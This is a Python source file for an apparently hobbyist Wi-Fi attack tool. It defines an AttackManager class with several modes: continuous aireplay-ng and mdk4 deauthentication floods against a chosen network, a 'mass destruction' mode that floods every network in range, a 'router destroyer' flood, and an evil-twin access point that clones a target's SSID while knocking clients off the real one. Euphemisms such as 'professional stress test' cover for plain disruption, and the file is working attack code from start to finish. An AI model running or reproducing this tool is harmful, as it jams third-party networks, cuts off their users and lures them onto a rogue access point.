#!/usr/bin/env python3

import os
import time
import threading
import subprocess
import http.server
import socketserver
from typing import List

class AttackManager:
    def __init__(self, core, scanner):
        self.core = core
        self.scanner = scanner
        self.attack_processes = []
        self.attack_running = False
        self.attack_threads = []
        self.evil_twin_running = False
        self.captured_password = None

    def single_target_attack(self):
        """Professional Single Target Attack"""
        print("\033[1;36m[→] Professional target acquisition...\033[0m")
        
        # Always fresh scan
        if self.scanner.wifi_scan():
            self.scanner.display_scan_results()
            target = self.scanner.select_target()
            
            if target:
                print(f"\033[1;31m[💣] Professional attack: {target['essid']}\033[0m")
                self.start_professional_single_attack(target)

    def start_professional_single_attack(self, target):
        """Start professional single target attack"""
        self.core.set_current_operation("SINGLE_TARGET_ATTACK")
        self.attack_running = True
        
        # Set target channel
        self.core.run_command(f"iwconfig {self.core.mon_interface} channel {target['channel']}")
        
        print("\033[1;31m[⚡] Deploying professional attack vectors...\033[0m")
        
        # Professional attack vectors without xterm
        print("\033[1;31m[🔧] VECTOR 1: Network Disruption\033[0m")
        proc1 = self.core.run_command(
            f"mdk4 {self.core.mon_interface} d -c {target['channel']} -B {target['bssid']} -s 1000 > /tmp/mdk4_attack.log 2>&1 &",
            background=True
        )
        if proc1:
            self.attack_processes.append(proc1)
            self.core.add_attack_process(proc1)
        
        print("\033[1;31m[🔧] VECTOR 2: Continuous Deauth\033[0m")
        proc2 = self.core.run_command(
            f"while true; do aireplay-ng --deauth 0 -a {target['bssid']} {self.core.mon_interface} > /tmp/deauth_attack.log 2>&1; sleep 1; done &", 
            background=True
        )
        if proc2:
            self.attack_processes.append(proc2)
            self.core.add_attack_process(proc2)
        
        print(f"\033[1;32m[✅] {len(self.attack_processes)} professional vectors deployed\033[0m")
        print(f"\033[1;31m[💥] Target {target['essid']} under professional attack!\033[0m")
        
        # Professional attack animation
        anim_thread = threading.Thread(target=self.show_professional_attack_animation, args=(target['essid'],))
        anim_thread.daemon = True
        anim_thread.start()
        
        print("\033[1;33m[⏹️] Press Enter to stop professional attack...\033[0m")
        input()
        
        self.stop_attacks()
        self.core.clear_current_operation()
        print("\033[1;32m[✅] Professional attack terminated\033[0m")

    def mass_destruction(self):
        """Professional Mass Network Disruption"""
        print("\033[1;31m[🌐] Professional mass disruption protocol...\033[0m")
        
        # Always fresh scan
        if self.scanner.wifi_scan():
            target_count = len(self.scanner.networks)
            
            if target_count == 0:
                print("\033[1;31m[✘] No professional targets found\033[0m")
                return
            
            print(f"\033[1;33m[🎯] Professional targeting: {target_count} networks\033[0m")
            
            confirm = input("\033[1;31m[?] Confirm professional disruption? (y/N): \033[0m")
            
            if confirm.lower() in ['y', 'yes']:
                self.core.set_current_operation("MASS_DESTRUCTION")
                self.attack_running = True
                
                print("\033[1;31m[⚡] Deploying professional disruption...\033[0m")
                
                # Professional mass attack
                attack_count = 0
                for idx, target in self.scanner.networks.items():
                    print(f"\033[1;31m[→] Professional vector {idx}: {target['essid']}\033[0m")
                    if self.deploy_professional_warhead(target, idx):
                        attack_count += 1
                    time.sleep(0.3)
                
                print(f"\033[1;32m[✅] {attack_count} professional vectors deployed\033[0m")
                print("\033[1;31m[💥] Professional mass disruption active!\033[0m")
                
                # Professional animation
                anim_thread = threading.Thread(target=self.show_mass_attack_animation)
                anim_thread.daemon = True
                anim_thread.start()
                
                print("\033[1;33m[⏹️] Press Enter to stop professional disruption...\033[0m")
                input()
                
                self.stop_attacks()
                self.core.clear_current_operation()
                print("\033[1;32m[✅] Professional disruption terminated\033[0m")
            else:
                print("\033[1;33m[❌] Professional disruption cancelled\033[0m")

    def deploy_professional_warhead(self, target, warhead_id):
        """Deploy professional warhead"""
        try:
            # Professional deauth attack
            deauth_cmd = f"while true; do iwconfig {self.core.mon_interface} channel {target['channel']}; aireplay-ng --deauth 50 -a {target['bssid']} {self.core.mon_interface} > /tmp/deauth_{warhead_id}.log 2>&1; sleep 2; done &"
            deauth_proc = self.core.run_command(deauth_cmd, background=True)
            
            if deauth_proc:
                self.attack_processes.append(deauth_proc)
                self.core.add_attack_process(deauth_proc)
                
            return True
        except Exception as e:
            print(f"\033[1;33m[!] Professional deployment failed: {e}\033[0m")
            return False

    def router_destroyer(self):
        """Professional Router Stress Test"""
        print("\033[1;31m[💀] Professional router assessment...\033[0m")
        
        confirm1 = input("\033[1;31m[?] Type 'STRESS' to confirm: \033[0m")
        if confirm1.lower() != 'stress':
            print("\033[1;33m[❌] Professional test cancelled\033[0m")
            return
            
        confirm2 = input("\033[1;31m[?] Type 'CONFIRM' to proceed: \033[0m")
        if confirm2.lower() != 'confirm':
            print("\033[1;33m[❌] Professional test cancelled\033[0m")
            return
        
        # Always fresh scan
        if self.scanner.wifi_scan():
            self.scanner.display_scan_results()
            target = self.scanner.select_target()
            
            if target:
                print(f"\033[1;31m[💀] Professional stress test: {target['essid']}\033[0m")
                self.start_professional_router_stress(target)

    def start_professional_router_stress(self, target):
        """Start professional router stress test"""
        self.core.set_current_operation("ROUTER_STRESS_TEST")
        self.attack_running = True
        
        print("\033[1;31m[⚡] Professional stress vectors...\033[0m")
        
        # Set target channel
        self.core.run_command(f"iwconfig {self.core.mon_interface} channel {target['channel']}")
        
        # Professional stress vectors
        print("\033[1;31m[🔧] VECTOR 1: Aggressive Stress\033[0m")
        proc1 = self.core.run_command(
            f"while true; do aireplay-ng --deauth 0 -a {target['bssid']} {self.core.mon_interface} > /tmp/stress1.log 2>&1; done &",
            background=True
        )
        if proc1:
            self.attack_processes.append(proc1)
            self.core.add_attack_process(proc1)
        
        print("\033[1;31m[🔧] VECTOR 2: MDK4 Stress\033[0m")
        proc2 = self.core.run_command(
            f"mdk4 {self.core.mon_interface} d -c {target['channel']} -B {target['bssid']} -s 2000 > /tmp/stress2.log 2>&1 &",
            background=True
        )
        if proc2:
            self.attack_processes.append(proc2)
            self.core.add_attack_process(proc2)
        
        print(f"\033[1;32m[✅] Professional stress test active\033[0m")
        print(f"\033[1;31m[💥] Router {target['essid']} under professional stress!\033[0m")
        
        # Stress animation
        anim_thread = threading.Thread(target=self.show_router_stress_animation)
        anim_thread.daemon = True
        anim_thread.start()
        
        print("\033[1;33m[⏹️] Press Enter to stop professional stress test...\033[0m")
        input()
        
        self.stop_attacks()
        self.core.clear_current_operation()
        print("\033[1;32m[✅] Professional stress test terminated\033[0m")

    def advanced_evil_twin(self):
        """Professional Access Point Replication"""
        print("\033[1;36m[→] Professional AP replication protocol...\033[0m")
        
        # Always fresh scan
        if self.scanner.wifi_scan():
            self.scanner.display_scan_results()
            target = self.scanner.select_target()
            
            if target:
                print(f"\033[1;34m[👥] Professional replication: {target['essid']}\033[0m")
                self.start_professional_ap_replication(target)

    def start_professional_ap_replication(self, target):
        """Start professional AP replication"""
        try:
            self.core.set_current_operation("AP_REPLICATION")
            self.evil_twin_running = True
            
            print("\033[1;36m[→] Professional AP replication setup...\033[0m")
            
            # Stop NetworkManager
            self.core.run_command("systemctl stop NetworkManager >/dev/null 2>&1")
            time.sleep(2)
            
            # Set channel
            self.core.run_command(f"iwconfig {self.core.mon_interface} channel {target['channel']}")
            
            # Professional hostapd configuration
            hostapd_conf = f"""
interface={self.core.mon_interface}
driver=nl80211
ssid={target['essid']}
channel={target['channel']}
hw_mode=g
auth_algs=1
wpa=2
wpa_passphrase=freewifi2024
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
ignore_broadcast_ssid=0
"""
            
            with open("/tmp/pro_ap.conf", "w") as f:
                f.write(hostapd_conf)
            
            # Professional dnsmasq configuration
            dnsmasq_conf = f"""
interface={self.core.mon_interface}
dhcp-range=192.168.1.100,192.168.1.200,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,8.8.8.8
log-queries
log-dhcp
"""
            
            with open("/tmp/pro_dnsmasq.conf", "w") as f:
                f.write(dnsmasq_conf)
            
            # Configure interface
            self.core.run_command(f"ifconfig {self.core.mon_interface} 192.168.1.1 netmask 255.255.255.0 up")
            
            # Start professional services
            print("\033[1;36m[→] Starting professional services...\033[0m")
            dnsmasq_proc = self.core.run_command("dnsmasq -C /tmp/pro_dnsmasq.conf", background=True)
            if dnsmasq_proc:
                self.attack_processes.append(dnsmasq_proc)
                self.core.add_attack_process(dnsmasq_proc)
            
            hostapd_proc = self.core.run_command("hostapd /tmp/pro_ap.conf", background=True)
            if hostapd_proc:
                self.attack_processes.append(hostapd_proc)
                self.core.add_attack_process(hostapd_proc)
            
            time.sleep(5)
            
            # Professional deauth attack
            print("\033[1;36m[→] Professional deauth synchronization...\033[0m")
            deauth_proc = self.core.run_command(
                f"while true; do aireplay-ng --deauth 10 -a {target['bssid']} {self.core.mon_interface} > /tmp/pro_deauth.log 2>&1; sleep 3; done &",
                background=True
            )
            if deauth_proc:
                self.attack_processes.append(deauth_proc)
                self.core.add_attack_process(deauth_proc)
            
            print("\033[1;32m[✅] Professional AP replication active!\033[0m")
            print(f"\033[1;32m[📡] Network: {target['essid']} (Professional Replica)\033[0m")
            print("\033[1;32m[🔓] Access Key: freewifi2024\033[0m")
            print("\033[1;33m[👀] Professional monitoring active...\033[0m")
            print("\033[1;33m[⏹️] Press Enter to stop professional replication...\033[0m")
            
            # Professional monitoring
            monitor_thread = threading.Thread(target=self.monitor_professional_ap)
            monitor_thread.daemon = True
            monitor_thread.start()
            
            input()
            
            # Cleanup
            self.stop_professional_ap()
            self.core.clear_current_operation()
            print("\033[1;32m[✅] Professional AP replication terminated\033[0m")
            
        except Exception as e:
            print(f"\033[1;31m[✘] Professional replication failed: {e}\033[0m")
            self.stop_professional_ap()
            self.core.run_command("systemctl start NetworkManager >/dev/null 2>&1")

    def monitor_professional_ap(self):
        """Monitor professional AP replication"""
        while self.evil_twin_running:
            # Check for connections
            result = self.core.run_command("tail -n 10 /var/log/syslog 2>/dev/null | grep dnsmasq | grep DHCPACK")
            if result and result.stdout:
                lines = result.stdout.strip().split('\n')
                for line in lines:
                    if 'DHCPACK' in line:
                        print(f"\033[1;32m[🔗] Professional connection: {line}\033[0m")
            
            time.sleep(3)

    def stop_professional_ap(self):
        """Stop professional AP replication"""
        self.evil_twin_running = False
        self.stop_attacks()
        self.core.run_command("pkill hostapd")
        self.core.run_command("pkill dnsmasq")
        self.core.run_command("systemctl start NetworkManager >/dev/null 2>&1")

    def show_professional_attack_animation(self, essid):
        """Professional attack animation"""
        frames = ["⚡", "💥", "🔥", "🌪️", "🌀"]
        messages = [
            f"Professional disruption: {essid}",
            f"Network interference: {essid}",
            f"Signal jamming: {essid}",
            f"Professional attack: {essid}"
        ]
        frame_idx = 0
        msg_idx = 0
        
        while self.attack_running:
            frame = frames[frame_idx]
            message = messages[msg_idx]
            frame_idx = (frame_idx + 1) % len(frames)
            msg_idx = (msg_idx + 1) % len(messages)
            print(f"\033[1;31m[{frame}] {message} - Professional attack active!\033[0m", end='\r')
            time.sleep(0.4)

    def show_mass_attack_animation(self):
        """Professional mass attack animation"""
        frames = ["🌐", "⚡", "💥", "🔥", "🌪️"]
        messages = [
            "Professional mass disruption",
            "Network-wide interference", 
            "Multi-target professional attack",
            "Professional disruption active"
        ]
        frame_idx = 0
        msg_idx = 0
        
        while self.attack_running:
            frame = frames[frame_idx]
            message = messages[msg_idx]
            frame_idx = (frame_idx + 1) % len(frames)
            msg_idx = (msg_idx + 1) % len(messages)
            print(f"\033[1;31m[{frame}] {message} - Professional mass attack!\033[0m", end='\r')
            time.sleep(0.4)

    def show_router_stress_animation(self):
        """Professional router stress animation"""
        frames = ["💀", "⚡", "💥", "🔥", "🌡️"]
        messages = [
            "Professional router stress test",
            "Hardware performance assessment",
            "Router stability evaluation",
            "Professional stress testing"
        ]
        frame_idx = 0
        msg_idx = 0
        
        while self.attack_running:
            frame = frames[frame_idx]
            message = messages[msg_idx]
            frame_idx = (frame_idx + 1) % len(frames)
            msg_idx = (msg_idx + 1) % len(messages)
            print(f"\033[1;31m[{frame}] {message} - Professional assessment!\033[0m", end='\r')
            time.sleep(0.4)

    def stop_attacks(self):
        """Stop all professional attacks"""
        self.attack_running = False
        self.evil_twin_running = False
        self.core.stop_all_attacks()
        self.attack_processes = []
